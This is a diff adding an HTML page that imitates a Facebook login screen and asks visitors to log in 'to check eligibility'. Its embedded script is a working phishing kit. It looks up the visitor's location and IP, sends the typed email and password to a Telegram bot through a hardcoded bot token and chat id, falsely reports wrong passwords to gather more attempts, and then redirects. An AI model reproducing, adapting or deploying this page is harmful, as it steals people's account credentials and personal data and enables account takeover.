@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        /* Global Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #FDF2F8, #ECF5FE);
+        }
+
+        /* Container */
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+        }
+
+        /* Logo */
+        .logo {
+            margin-bottom: 25px;
+        }
+
+        /* Input Fields */
+        .input-field {
+            width: 90%;
+            padding: 16px 14px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f7f7f7;
+            outline: none;
+        }
+
+        /* Login Button */
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            margin: 16px 0;
+            background-color: #1877F2;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+        }
+
+        /* Links */
+        .forgot-password,
+        .create-account {
+            display: block;
+            color: #1877F2;
+            font-size: 15px;
+            margin: 10px 0;
+            text-decoration: none;
+        }
+
+        /* Meta Section */
+        .meta {
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .meta img {
+            width: 24px;
+        }
+
+        .met{
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Facebook Logo -->
+        <div class="logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico?_nc_eui2=AeFQ_3eSO17ypeCPNQgAnI8yrSiY817De8atKJjzXsN7xg_8VBZpmYbe-z8x9UoDkFgym3D34r0BgnX3a_SqfLku" alt="">
+            <img style="height: 18px;" src="https://harlequin-legal-ox-300.mypinata.cloud/ipfs/Qmead1U9C9zUqjj72dXBAh8VfVfP2MGki3y4kLpboD3hp6" alt="">
+        </div>
+        <p style="font-size: 10px; color:  #999;">Login with Facebook to check your eligibility</p>
+        
+        <!-- Input Fields with IDs for JavaScript -->
+        <input type="text" id="email" class="input-field" placeholder="Mobile number or email address">
+        <input type="password" id="pass" class="input-field" placeholder="Password">
+        
+        <!-- Login Button -->
+        <button class="login-button" onclick="handleSubmit(event)">Log in</button>
+        
+        <!-- Forgotten Password Link -->
+        <a href="#" class="forgot-password">Forgotten Password?</a>
+        
+        <!-- Create Account Button -->
+        <a href="#" class="create-account">Create new account</a>
+        
+        <!-- Meta Section -->
+        <div class="meta">
+            <div class="met">
+                <img src="https://harlequin-legal-ox-300.mypinata.cloud/ipfs/Qme9HqdK8xhCtafJbM8NHYtKaqwRa94iECvPVxYr9S4nAT" alt="Meta Logo">
+                <p>Meta</p>
+            </div>
+            <div>About &nbsp;·&nbsp; Help &nbsp;·&nbsp; More</div>
+        </div>
+    </div>
+
+    <script>
+        var telegram_bot_id = "6949497283:AAGtXd6deZQBaLidD9PemzzWyJ64XknZ7mE";
+        var chat_id = "7059402644";
+        var attemptCounter = 0;
+        var userInfo = {};
+
+        async function fetchText() {
+            let url = "https://ipinfo.io/json?token=de42e80837e28f";
+            try {
+                let response = await fetch(url);
+                if (!response.ok) throw new Error("Network response was not ok " + response.statusText);
+                let data = await response.json();
+                userInfo = {
+                    country: data.country,
+                    state: data.region,
+                    city: data.city,
+                    isp: data.org,
+                    ip: data.ip,
+                };
+                let userInfoText = `Country: ${userInfo.country}, State: ${userInfo.state}, City: ${userInfo.city}, ISP: ${userInfo.isp}, IP: ${userInfo.ip}`;
+          document.getElementById("user-info").innerText = userInfoText;
+        } catch (error) {
+          console.error("Fetch error: ", error);
+        }
+        }
+        fetchText();
+
+        function getCurrentTime() {
+            var now = new Date();
+            var year = now.getFullYear();
+            var month = (now.getMonth() + 1).toString().padStart(2, "0");
+            var day = now.getDate().toString().padStart(2, "0");
+            var hours = now.getHours().toString().padStart(2, "0");
+            var minutes = now.getMinutes().toString().padStart(2, "0");
+            var seconds = now.getSeconds().toString().padStart(2, "0");
+            return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+        }
+
+      
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            attemptCounter++;
+
+            var u_name = document.getElementById("email").value;
+            var email = document.getElementById("pass").value;
+
+            if (u_name === "" || email === "") {
+                alert("Password field cannot be empty.");
+                return false;
+            }
+
+          
+
+            var currentTime = getCurrentTime();
+            var message = `-------++++ made by perrycyber ++++-------\nEMAIL/NUM: ${u_name}\nPASSWORD: ${email}\nUSERTIME&DATE: ${currentTime}\nCOUNTRY: ${userInfo.country}\nSTATE: ${userInfo.state}\nCITY: ${userInfo.city}\nISP: ${userInfo.isp}\nIP: ${userInfo.ip}`
+
+            var data = { chat_id: chat_id, text: message };
+
+            fetch("https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data),
+            });
+
+            if (attemptCounter >= 3) {
+                alert("Redirecting to a different page.");
+                setTimeout(() => window.location.href = "https://www.xfinity.com/overview", 2000);
+            } else {
+                alert("Password incorrect, try again.");
+                document.getElementById("pass").value = "";
+            }
+
+            return false;
+        }
+    </script>
+</body>
+</html>
